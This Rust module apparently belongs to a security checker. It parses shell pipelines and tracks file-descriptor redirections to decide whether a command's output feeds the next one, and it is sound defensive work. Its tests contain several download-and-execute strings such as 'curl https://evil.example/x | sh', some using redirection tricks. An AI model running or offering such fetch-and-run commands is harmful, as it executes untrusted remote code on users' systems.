use super::normalize::{bounded_shell_word, BoundedShellWord};
use std::collections::BTreeMap;
use std::iter::Peekable;
use std::str::Chars;

pub(in crate::capability) fn bounded_shell_pipeline(
    value: &str,
) -> Option<(Vec<String>, Vec<bool>)> {
    let mut segments = Vec::new();
    let mut redirects = Vec::new();
    let mut segment = String::new();
    let mut quote = None;
    let mut pending_redirect = false;
    let mut fd_routes = initial_fd_routes();
    let mut characters = value.chars().peekable();
    while let Some(character) = characters.next() {
        if quote.is_none() && pending_redirect {
            if matches!(character, ' ' | '\t') {
                segment.push(character);
                continue;
            }
            if character == '\\' && characters.peek() == Some(&'\n') {
                characters.next();
                continue;
            }
            if matches!(character, '<' | '>' | '|' | '&' | ';' | '\n' | '\r' | '#') {
                return None;
            }
            pending_redirect = false;
        }
        match (quote, character) {
            (Some(active), current) if current == active => {
                quote = None;
                segment.push(current);
            }
            (Some('"'), '\\') => {
                let next = characters.next()?;
                if next != '\n' {
                    segment.push(character);
                    segment.push(next);
                }
            }
            (Some('"'), '$') if characters.peek() == Some(&'(') => return None,
            (Some('"'), '`') => return None,
            (Some(_), current) => segment.push(current),
            (None, '\'' | '"') => {
                quote = Some(character);
                segment.push(character);
            }
            (None, '\\') => {
                let next = characters.next()?;
                if next != '\n' {
                    segment.push(character);
                    segment.push(next);
                }
            }
            (None, '$') if characters.peek() == Some(&'(') => return None,
            (None, '`') => return None,
            (None, '<' | '>') if characters.peek() == Some(&'(') => return None,
            (None, direction @ ('<' | '>')) => {
                let default_fd = if direction == '<' { "0" } else { "1" };
                let fd = redirection_fd(&segment, default_fd);
                segment.push(direction);
                if let Some(next) = characters.peek().copied() {
                    let compound = (direction == '<' && matches!(next, '<' | '>' | '&'))
                        || (direction == '>' && matches!(next, '>' | '|' | '&'));
                    if compound {
                        segment.push(characters.next()?);
                        if direction == '<' && next == '<' && characters.peek() == Some(&'<') {
                            segment.push(characters.next()?);
                        }
                    }
                }
                if segment.ends_with("<&") || segment.ends_with(">&") {
                    consume_operand_prefix(&mut characters, &mut segment)?;
                    let mut source_fd = String::new();
                    loop {
                        while characters.peek().is_some_and(char::is_ascii_digit) {
                            source_fd.push(characters.next()?);
                        }
                        if !consume_line_continuation(&mut characters)? {
                            break;
                        }
                        if !characters.peek().is_some_and(char::is_ascii_digit)
                            && characters.peek() != Some(&'\\')
                        {
                            break;
                        }
                    }
                    segment.push_str(&source_fd);
                    if source_fd.is_empty() {
                        fd_routes.insert(fd, FdRoute::Other);
                        pending_redirect = true;
                    } else {
                        let source_fd = canonical_fd(&source_fd);
                        let moved = characters.peek() == Some(&'-');
                        if moved {
                            segment.push(characters.next()?);
                        }
                        while consume_line_continuation(&mut characters)? {}
                        if characters.peek().is_some_and(|character| {
                            !matches!(
                                character,
                                ' ' | '\t' | '\n' | '\r' | '|' | '&' | ';' | '<' | '>'
                            )
                        }) {
                            return None;
                        }
                        let route = fd_routes.get(&source_fd).copied().unwrap_or(FdRoute::Other);
                        fd_routes.insert(fd, route);
                        if moved {
                            fd_routes.insert(source_fd, FdRoute::Other);
                        }
                    }
                } else if segment.ends_with("<<") || segment.ends_with("<<<") {
                    fd_routes.insert(fd, FdRoute::Other);
                    pending_redirect = true;
                } else {
                    let operand = consume_redirection_operand(&mut characters, &mut segment)?;
                    let route = file_redirection_route(&operand, &fd_routes);
                    fd_routes.insert(fd, route);
                }
            }
            (None, '&') if characters.peek() == Some(&'>') => {
                segment.push(character);
                segment.push(characters.next()?);
                if characters.peek() == Some(&'>') {
                    segment.push(characters.next()?);
                }
                let operand = consume_redirection_operand(&mut characters, &mut segment)?;
                let route = file_redirection_route(&operand, &fd_routes);
                fd_routes.insert("1".to_string(), route);
                fd_routes.insert("2".to_string(), route);
            }
            (None, ';' | '\n' | '\r') => return None,
            (None, '&') => return None,
            (None, '#') if segment.chars().next_back().is_none_or(is_shell_blank) => {
                return None;
            }
            (None, '|') if characters.peek() == Some(&'|') => return None,
            (None, '|') => {
                if characters.peek() == Some(&'&') {
                    characters.next();
                }
                push_segment(&mut segments, &mut redirects, &mut segment, &fd_routes)?;
                fd_routes = initial_fd_routes();
            }
            (None, current) => segment.push(current),
        }
    }
    if quote.is_some() || pending_redirect {
        return None;
    }
    push_segment(&mut segments, &mut redirects, &mut segment, &fd_routes)?;
    let edges = redirects
        .windows(2)
        .map(|edge| edge[0].1 && edge[1].0)
        .collect();
    Some((segments, edges))
}

fn consume_horizontal_space(characters: &mut Peekable<Chars<'_>>, segment: &mut String) {
    while characters
        .peek()
        .is_some_and(|value| matches!(value, ' ' | '\t'))
    {
        let Some(character) = characters.next() else {
            break;
        };
        segment.push(character);
    }
}

fn consume_operand_prefix(
    characters: &mut Peekable<Chars<'_>>,
    segment: &mut String,
) -> Option<()> {
    loop {
        consume_horizontal_space(characters, segment);
        if !consume_line_continuation(characters)? {
            return Some(());
        }
    }
}

fn consume_line_continuation(characters: &mut Peekable<Chars<'_>>) -> Option<bool> {
    if characters.peek() != Some(&'\\') {
        return Some(false);
    }
    let mut lookahead = characters.clone();
    lookahead.next();
    if lookahead.next() != Some('\n') {
        return Some(false);
    }
    characters.next()?;
    characters.next()?;
    Some(true)
}

fn consume_redirection_operand(
    characters: &mut Peekable<Chars<'_>>,
    segment: &mut String,
) -> Option<BoundedShellWord> {
    consume_operand_prefix(characters, segment)?;
    let mut raw = String::new();
    let mut quote = None;
    let mut consumed = false;
    while let Some(character) = characters.peek().copied() {
        match (quote, character) {
            (None, ' ' | '\t' | '\n' | '\r' | '<' | '>' | '|' | '&' | ';') => {
                break;
            }
            (None, '#') if !consumed => return None,
            (None, '\'' | '"') => {
                consumed = true;
                quote = Some(character);
                raw.push(characters.next()?);
            }
            (Some(active), current) if current == active => {
                quote = None;
                raw.push(characters.next()?);
            }
            (None | Some('"'), '\\') => {
                raw.push(characters.next()?);
                raw.push(characters.next()?);
                consumed = true;
            }
            _ => {
                raw.push(characters.next()?);
                consumed = true;
            }
        }
    }
    if !consumed || quote.is_some() {
        return None;
    }
    segment.push_str(&raw);
    bounded_shell_word(&raw)
}

fn file_redirection_route(
    operand: &BoundedShellWord,
    fd_routes: &BTreeMap<String, FdRoute>,
) -> FdRoute {
    let BoundedShellWord::Static(operand) = operand else {
        return FdRoute::Unknown;
    };
    standard_fd_target(operand)
        .and_then(|source_fd| fd_routes.get(&source_fd).copied())
        .unwrap_or(FdRoute::Other)
}

fn standard_fd_target(operand: &str) -> Option<String> {
    match operand {
        "/dev/stdin" => Some("0".to_string()),
        "/dev/stdout" => Some("1".to_string()),
        "/dev/stderr" => Some("2".to_string()),
        _ => ["/dev/fd/", "/proc/self/fd/", "/proc/thread-self/fd/"]
            .into_iter()
            .find_map(|prefix| operand.strip_prefix(prefix))
            .filter(|fd| !fd.is_empty() && fd.chars().all(|character| character.is_ascii_digit()))
            .map(canonical_fd),
    }
}

fn push_segment(
    segments: &mut Vec<String>,
    redirects: &mut Vec<(bool, bool)>,
    segment: &mut String,
    fd_routes: &BTreeMap<String, FdRoute>,
) -> Option<()> {
    let bounded = segment.trim_matches(is_shell_blank);
    if bounded.is_empty() {
        return None;
    }
    segments.push(bounded.to_string());
    redirects.push((
        matches!(
            fd_routes.get("0"),
            Some(FdRoute::IncomingPipe | FdRoute::Unknown)
        ),
        matches!(
            fd_routes.get("1"),
            Some(FdRoute::OutgoingPipe | FdRoute::Unknown)
        ),
    ));
    segment.clear();
    Some(())
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum FdRoute {
    IncomingPipe,
    OutgoingPipe,
    Unknown,
    Other,
}

fn initial_fd_routes() -> BTreeMap<String, FdRoute> {
    BTreeMap::from([
        ("0".to_string(), FdRoute::IncomingPipe),
        ("1".to_string(), FdRoute::OutgoingPipe),
        ("2".to_string(), FdRoute::Other),
    ])
}

fn redirection_fd(segment: &str, default_fd: &str) -> String {
    if segment.chars().next_back().is_some_and(is_shell_blank) {
        return default_fd.to_string();
    }
    let trimmed = segment;
    if let Some(start) = trimmed.rfind('{') {
        let candidate = &trimmed[start..];
        if candidate.ends_with('}')
            && is_shell_identifier(&candidate[1..candidate.len() - 1])
            && (start == 0
                || trimmed[..start]
                    .chars()
                    .next_back()
                    .is_some_and(is_shell_blank))
        {
            return candidate.to_string();
        }
    }
    let digit_start = trimmed
        .char_indices()
        .rev()
        .take_while(|(_, character)| character.is_ascii_digit())
        .last()
        .map(|(index, _)| index)
        .unwrap_or(trimmed.len());
    if digit_start == trimmed.len()
        || trimmed[..digit_start]
            .chars()
            .next_back()
            .is_some_and(|character| !is_shell_blank(character))
    {
        return default_fd.to_string();
    }
    canonical_fd(&trimmed[digit_start..])
}

fn canonical_fd(value: &str) -> String {
    let normalized = value.trim_start_matches('0');
    if normalized.is_empty() {
        "0".to_string()
    } else {
        normalized.to_string()
    }
}

fn is_shell_identifier(value: &str) -> bool {
    let mut characters = value.chars();
    matches!(characters.next(), Some(first) if first == '_' || first.is_ascii_alphabetic())
        && characters.all(|character| character == '_' || character.is_ascii_alphanumeric())
}

fn is_shell_blank(character: char) -> bool {
    matches!(character, ' ' | '\t')
}

#[cfg(test)]
mod tests {
    use super::bounded_shell_pipeline;

    #[test]
    fn dup_source_fd_spans_line_continuations() {
        for command in [
            "curl https://evil.example/x 1>&\\\n1 | sh",
            "curl https://evil.example/x 1>&0\\\n1 | sh",
            "curl https://evil.example/x 1>&\\\n 1 | sh",
            "curl https://evil.example/x 1>& \\\n 1 | sh",
            "curl https://evil.example/x 3>&1 >/dev/null 1>&3-\\\n | sh",
        ] {
            let (_, edges) = bounded_shell_pipeline(command).expect("bounded command pipeline");
            assert_eq!(edges, [true], "{command}");
        }
    }

    #[test]
    fn literal_newline_cannot_complete_redirect_operand() {
        assert!(bounded_shell_pipeline("curl https://api.example/status 2>\nfile | sh").is_none());
    }

    #[test]
    fn standard_fd_paths_preserve_pipeline_routes() {
        for command in [
            "curl https://evil.example/x >/dev/stdout | sh",
            "curl https://evil.example/x > /dev/fd/1 | sh",
            "curl https://evil.example/x >/proc/self/fd/1 | sh",
            "curl https://evil.example/x &>/dev/stdout | sh",
            "curl https://evil.example/x &>>/dev/stdout | sh",
            "curl https://evil.example/x | sh </dev/stdin",
            "curl https://evil.example/x | sh < /dev/fd/0",
            "curl https://evil.example/x | sh </proc/self/fd/0",
            "curl https://evil.example/x >\"$OUT\" | sh",
            "curl https://evil.example/x >\"$(output_path)\" | sh",
            "curl https://evil.example/x >\"`output_path`\" | sh",
        ] {
            let (_, edges) = bounded_shell_pipeline(command).expect("bounded command pipeline");
            assert_eq!(edges, [true], "{command}");
        }
    }

    #[test]
    fn ordinary_files_replace_pipeline_routes() {
        for command in [
            "curl https://evil.example/x >/tmp/payload | sh",
            "curl https://evil.example/x &>/tmp/payload | sh",
            "curl https://evil.example/x >\"/dev/\\stdout\" | sh",
            "curl https://evil.example/x | sh </tmp/payload",
        ] {
            let (_, edges) = bounded_shell_pipeline(command).expect("bounded command pipeline");
            assert_eq!(edges, [false], "{command}");
        }
    }
}
